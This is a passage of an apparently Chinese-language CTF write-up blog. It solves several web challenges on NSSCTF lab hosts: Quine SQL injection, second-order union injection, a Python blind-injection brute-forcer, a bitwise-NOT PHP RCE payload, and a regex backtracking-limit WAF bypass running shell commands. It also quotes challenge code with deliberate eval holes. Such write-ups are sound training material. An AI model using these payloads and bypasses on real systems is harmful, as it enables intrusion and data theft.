class="string">&#x27;)/ei&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>,</span><br><span class="line">        <span class="variable">$str</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$re</span> =&gt; <span class="variable">$str</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">complex</span>(<span class="variable">$re</span>, <span class="variable">$str</span>). <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>本来试了一下filterchain，可以用是可以用但是flag出不来，可能被特意设计了</p><p>这里主要涉及到<code>preg_replace</code>的一个RCE漏洞，参考：<a href="https://xz.aliyun.com/t/2557">https://xz.aliyun.com/t/2557</a></p><p>主要就是构造<code>preg_replace(&#39;.*&#39;)/ei&#39;,&#39;strtolower(&quot;\\1&quot;)&#39;, &#123;$&#123;此处填函数名&#125;&#125;);</code><br> 大概就是把所有字符替换为函数执行结果。<br> 但是GET传<code>.*=xxx</code>会出问题，自动将第一个非法字符转化为下划线（看链接），所以构造：</p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241201090321285.png" alt="image-20241201090321285" style="zoom: 67%;" /><p>这里没有出flag，那就是环境问题了，之前的filterchain应该也是可以的！！</p><h2 id="NISACTF-2022-hardsql"><a href="#NISACTF-2022-hardsql" class="headerlink" title="[NISACTF 2022]hardsql"></a>[NISACTF 2022]hardsql</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">password=_POST[‘passwd’];</span><br><span class="line">sql=&quot;SELECT passwd FROM users WHERE username=′bilala′ and passwd=′password’;&quot;;</span><br></pre></td></tr></table></figure><p>根据题目描述，username为bilala，password处存在注入点，可以进行sql注入测试。</p><p>先fuzz一下，存在waf</p><p>发现like和百分号没有被过滤，直接爆破密码了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://node5.anna.nssctf.cn:23092/login.php&#x27;</span></span><br><span class="line">str_sum=string.digits+string.ascii_letters</span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> str_sum:</span><br><span class="line">        data=&#123;<span class="string">&quot;username&quot;</span>:<span class="string">&quot;bilala&quot;</span>,<span class="string">&quot;passwd&quot;</span>:<span class="string">f&quot;-1&#x27;/**/or/**/passwd/**/like/**/&#x27;<span class="subst">&#123;flag+j&#125;</span>%&#x27;#&quot;</span>&#125;</span><br><span class="line">        res=requests.post(url,data)</span><br><span class="line">        <span class="built_in">print</span>(data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;nothing&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            flag+=j</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b2f2d15b3ae082ca29697d8dcd420fd7</span><br></pre></td></tr></table></figure><p>登陆成功后源码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//多加了亿点点过滤</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">&quot;config.php&quot;</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">alertMes</span>(<span class="params"><span class="variable">$mes</span>,<span class="variable">$url</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;<span class="subst">&#123;$mes&#125;</span>&#x27;);location.href=&#x27;<span class="subst">&#123;$url&#125;</span>&#x27;;&lt;/script&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkSql</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/if|regexp|between|in|flag|=|&gt;|&lt;|and|\||right|left|insert|database|reverse|update|extractvalue|floor|join|substr|&amp;|;|\\\$|char|\x0a|\x09|column|sleep|\ /i&quot;</span>,<span class="variable">$s</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">alertMes</span>(<span class="string">&#x27;waf here&#x27;</span>, <span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] != <span class="string">&#x27;&#x27;</span> &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>]) &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>] != <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">    <span class="variable">$username</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$password</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$username</span> !== <span class="string">&#x27;bilala&#x27;</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">alertMes</span>(<span class="string">&#x27;only bilala can login&#x27;</span>, <span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">checkSql</span>(<span class="variable">$password</span>);</span><br><span class="line">    <span class="variable">$sql</span>=<span class="string">&quot;SELECT passwd FROM users WHERE username=&#x27;bilala&#x27; and passwd=&#x27;<span class="subst">$password</span>&#x27;;&quot;</span>;</span><br><span class="line">    <span class="variable">$user_result</span>=<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$MysqlLink</span>,<span class="variable">$sql</span>);</span><br><span class="line">    <span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="variable">$user_result</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$row</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">alertMes</span>(<span class="string">&#x27;nothing found&#x27;</span>,<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$row</span>[<span class="string">&#x27;passwd&#x27;</span>] === <span class="variable">$password</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$password</span> == <span class="string">&#x27;b2f2d15b3ae082ca29697d8dcd420fd7&#x27;</span>)&#123;</span><br><span class="line">            <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">            <span class="keyword">die</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="variable">$FLAG</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="title function_ invoke__">alertMes</span>(<span class="string">&quot;wrong password&quot;</span>,<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>重点在此处：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$row</span>[<span class="string">&#x27;passwd&#x27;</span>] === <span class="variable">$password</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$password</span> == <span class="string">&#x27;b2f2d15b3ae082ca29697d8dcd420fd7&#x27;</span>)&#123;</span><br><span class="line">            <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">            <span class="keyword">die</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="variable">$FLAG</span>);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>考点为sql注入之Quine注入</p><p><strong>这里先介绍一下Quine注入：</strong></p><p><a href="https://nakaii.top/2023/04/24/%E8%AE%B0%E4%B8%80%E6%AC%A1Quino%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/index.html">https://nakaii.top/2023/04/24/%E8%AE%B0%E4%B8%80%E6%AC%A1Quino%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/index.html</a></p><p>Quine又称为自产生程序，在sql注入中是一种使得输入的sql语句和输出的sql语句一致的技术，就是说输入的语句进行查询后生成的结果与输入的语句相同（自己生成自己），可以看到题目中的判断正是考察了这个点。</p><p>突破口是replace函数</p><blockquote><p>replace(object, search, replace)</p></blockquote><p>此函数用于将object中的所有search替换为replace。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [(none)]&gt; select replace(&quot;.&quot;, char(46), &quot;!&quot;);</span><br><span class="line">+-----------------------------+</span><br><span class="line">| replace(&quot;.&quot;, char(46), &quot;!&quot;) |</span><br><span class="line">+-----------------------------+</span><br><span class="line">| !                           |</span><br><span class="line">+-----------------------------+</span><br><span class="line">1 row in set (0.000 sec)</span><br></pre></td></tr></table></figure><p><strong>尝试使输入输出保持一致！</strong></p><p><strong>替换object</strong></p><p>尝试通过替换object使输入输出保持一致:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [(none)]&gt; select replace(&#x27;replace(&quot;.&quot;,char(46),&quot;.&quot;)&#x27;,char(46),&#x27;.&#x27;);</span><br><span class="line">+---------------------------------------------------+</span><br><span class="line">| replace(&#x27;replace(&quot;.&quot;,char(46),&quot;.&quot;)&#x27;,char(46),&#x27;.&#x27;) |</span><br><span class="line">+---------------------------------------------------+</span><br><span class="line">| replace(&quot;.&quot;,char(46),&quot;.&quot;)                         |</span><br><span class="line">+---------------------------------------------------+</span><br><span class="line">1 row in set (0.000 sec)</span><br></pre></td></tr></table></figure><p>还是差一点，只是将object中的字符串原样输出了，replace还没怎么用到，是否可以通过更改replace使输入输出保持一致？</p><p><strong>替换object+replace</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [(none)]&gt; select replace(&#x27;replace(&quot;.&quot;,char(46),&quot;.&quot;)&#x27;,char(46),&#x27;replace(&quot;.&quot;,char(46),&quot;.&quot;)&#x27;);</span><br><span class="line">+---------------------------------------------------------------------------+</span><br><span class="line">| replace(&#x27;replace(&quot;.&quot;,char(46),&quot;.&quot;)&#x27;,char(46),&#x27;replace(&quot;.&quot;,char(46),&quot;.&quot;)&#x27;) |</span><br><span class="line">+---------------------------------------------------------------------------+</span><br><span class="line">| replace(&quot;replace(&quot;.&quot;,char(46),&quot;.&quot;)&quot;,char(46),&quot;replace(&quot;.&quot;,char(46),&quot;.&quot;)&quot;) |</span><br><span class="line">+---------------------------------------------------------------------------+</span><br><span class="line">1 row in set (0.000 sec)</span><br></pre></td></tr></table></figure><p>可以看到确实长得差不多了，但还是有问题，包围object和replace的符号仍然有差异。object中的.被替换为了replace(“.”,char(46),”.”),但包围.的引号为双引号，如果直接更改为单引号会造成最外层replace的object界限不明确，因此还需要再套一层replace，将双引号改为单引号。</p><p><strong>解决引号问题</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">replace(&#x27;&quot;.&quot;&#x27;,char(34),char(39))</span><br></pre></td></tr></table></figure><p>语句将字符串中的双引号替换为了单引号，这就是解决引号问题的方法，即在object外再套一层replace将里面的双引号更改为单引号：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [(none)]&gt; select replace(replace(&#x27;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#x27;,char(34),char(39)),char(46),&#x27;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#x27;);</span><br><span class="line">+------------------------------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="line">| replace(replace(&#x27;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#x27;,char(34),char(39)),char(46),&#x27;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#x27;) |</span><br><span class="line">+------------------------------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="line">| replace(replace(&#x27;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#x27;,char(34),char(39)),char(46),&#x27;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#x27;) |</span><br><span class="line">+------------------------------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="line">1 row in set (0.000 sec)</span><br></pre></td></tr></table></figure><p><strong>总结</strong></p><p>Quine基本形式：</p><blockquote><p> replace(replace(‘str’,char(34),char(39)),char(46),‘str’)</p></blockquote><p>先将str里的双引号替换成单引号，再用str替换str里的.</p><p>str基本形式（可以理解成上面的”.”）：</p><blockquote><p> replace(replace(“.”,char(34),char(39)),char(46),”.”)</p></blockquote><p>完整的Quine就是<em><strong>Quine基本形式+str基本形式</strong></em></p><p>这时我们再回头看题目</p><p>str基本形式为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;/**/union/**/select/**/replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)#</span><br></pre></td></tr></table></figure><p>quine基本形式为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;/**/union/**/select/**/replace(replace(&#x27;str&#x27;,char(34),char(39)),char(46),&#x27;str&#x27;)#</span><br></pre></td></tr></table></figure><p>总体为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;/**/union/**/select/**/replace(replace(&#x27;&quot;/**/union/**/select/**/replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)#&#x27;,char(34),char(39)),char(46),&#x27;&quot;/**/union/**/select/**/replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)#&#x27;)#</span><br></pre></td></tr></table></figure><p>但是此处char被过滤，那么用chr也行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;/**/union/**/select/**/replace(replace(&#x27;&quot;/**/union/**/select/**/replace(replace(&quot;.&quot;,chr(34),chr(39)),chr(46),&quot;.&quot;)#&#x27;,chr(34),chr(39)),chr(46),&#x27;&quot;/**/union/**/select/**/replace(replace(&quot;.&quot;,chr(34),chr(39)),chr(46),&quot;.&quot;)#&#x27;)#</span><br></pre></td></tr></table></figure><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241201162019665.png" alt="image-20241201162019665"></p><p>NSSCTF{23e578bc-4904-467f-8c73-544bccadb796}</p><h2 id="October-2019-Twice-SQL-Injection"><a href="#October-2019-Twice-SQL-Injection" class="headerlink" title="[October 2019]Twice SQL Injection"></a>[October 2019]Twice SQL Injection</h2><p>标题直说了，二次注入</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241201162431475.png" alt="image-20241201162431475"></p><p>存在登陆注册界面，可能就是通过注册，将恶意sql存入数据库，登陆时将username代入select语句从而导致了二次注入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union select database()#</span><br></pre></td></tr></table></figure><p>以上payload使登陆后页面回显ctftraining</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union select (select group_concat(table_name) from information_schema.tables where table_schema=database())#</span><br></pre></td></tr></table></figure><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241201162925243.png" alt="image-20241201162925243" style="zoom:67%;" /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union select (select group_concat(column_name) from information_schema.columns where table_name=&#x27;flag&#x27;)#</span><br></pre></td></tr></table></figure><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241201163048605.png" alt="image-20241201163048605" style="zoom:67%;" /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union select (select group_concat(flag) from flag)#</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NSSCTF&#123;1f52dc37-5280-432e-8935-ed7a31f848a0&#125;</span><br></pre></td></tr></table></figure><h2 id="鹏城杯-2022-简单的php"><a href="#鹏城杯-2022-简单的php" class="headerlink" title="[鹏城杯 2022]简单的php"></a>[鹏城杯 2022]简单的php</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="variable">$code</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$code</span>) &gt; <span class="number">80</span> <span class="keyword">or</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[A-Za-z0-9]|\&#x27;|&quot;|`|\ |,|\.|-|\+|=|\/|\\|&lt;|&gt;|\$|\?|\^|&amp;|\|/is&#x27;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27; Hello&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^\s\(\)]+?\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$code</span>))&#123;</span><br><span class="line">        @<span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>无字母字母rce和无参rce的结合版</p><p>看过滤，直接用取反就可以</p><p>最终想要构造的是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system(end(getallheaders()));</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[~%8C%86%8C%8B%9A%92][!%FF]([~%9A%91%9B][!%FF]([~%98%9A%8B%9E%93%93%97%9A%9E%9B%9A%8D%8C][!%FF]()));</span><br></pre></td></tr></table></figure><p> 然后用二维数组进行拼接必须有[!%FF进行分割]</p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241201165516664.png" alt="image-20241201165516664" style="zoom:67%;" /><p>NSSCTF{8eb0d6fc-55b1-4d5b-90bc-5140b5565b6b}</p><h2 id="NISACTF-2022-middlerce"><a href="#NISACTF-2022-middlerce" class="headerlink" title="[NISACTF 2022]middlerce"></a>[NISACTF 2022]middlerce</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;check.php&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;letter&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$txw4ever</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;letter&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^.*([\w]|\^|\*|\(|\~|\`|\?|\/| |\||\&amp;|!|\&lt;|\&gt;|\&#123;|\x09|\x0a|\[).*$/m&#x27;</span>,<span class="variable">$txw4ever</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;再加把油喔&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$command</span> = <span class="title function_ invoke__">json_decode</span>(<span class="variable">$txw4ever</span>,<span class="literal">true</span>)[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">        <span class="title function_ invoke__">checkdata</span>(<span class="variable">$command</span>);</span><br><span class="line">        @<span class="keyword">eval</span>(<span class="variable">$command</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>只需绕过preg_match后面就简单了，preg回溯次数绕过，大于1000000字符就可以啦简单</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://node4.anna.nssctf.cn:28728/&#x27;</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;&#123;&quot;cmd&quot;:&quot;eeeee&quot;,&quot;aaa&quot;:&quot;&#x27;</span>+<span class="string">&quot;$&quot;</span>*<span class="number">1000000</span>+<span class="string">&#x27;&quot;&#125;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line"></span><br><span class="line">res=requests.post(url,data=&#123;<span class="string">&quot;letter&quot;</span>:payload&#125;)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241201195030922.png" alt="image-20241201195030922"></p><p>回显不再是再加把油喔，那么就成功了，接下来我们需要绕过的就是checkdata函数！</p><p>eval的话可以短标签+反引号</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://node4.anna.nssctf.cn:28728/&#x27;</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;&#123;&quot;cmd&quot;:&quot;?&gt;&lt;?=`ls /`?&gt;&quot;,&quot;aaa&quot;:&quot;&#x27;</span>+<span class="string">&quot;$&quot;</span>*<span class="number">1000000</span>+<span class="string">&#x27;&quot;&#125;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line"></span><br><span class="line">res=requests.post(url,data=&#123;<span class="string">&quot;letter&quot;</span>:payload&#125;)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure><p>根目录发现&#x2F;flag，那么就拿捏了啊</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nl /f*</span><br></pre></td></tr></table></figure><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241201195811853.png" alt="image-20241201195811853"></p><h2 id="CISCN-2023-华北-ez-date"><a href="#CISCN-2023-华北-ez-date" class="headerlink" title="[CISCN 2023 华北]ez_date"></a>[CISCN 2023 华北]ez_date</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">date</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$this</span>-&gt;a)||<span class="title function_ invoke__">is_array</span>(<span class="variable">$this</span>-&gt;b))&#123;</span><br><span class="line">          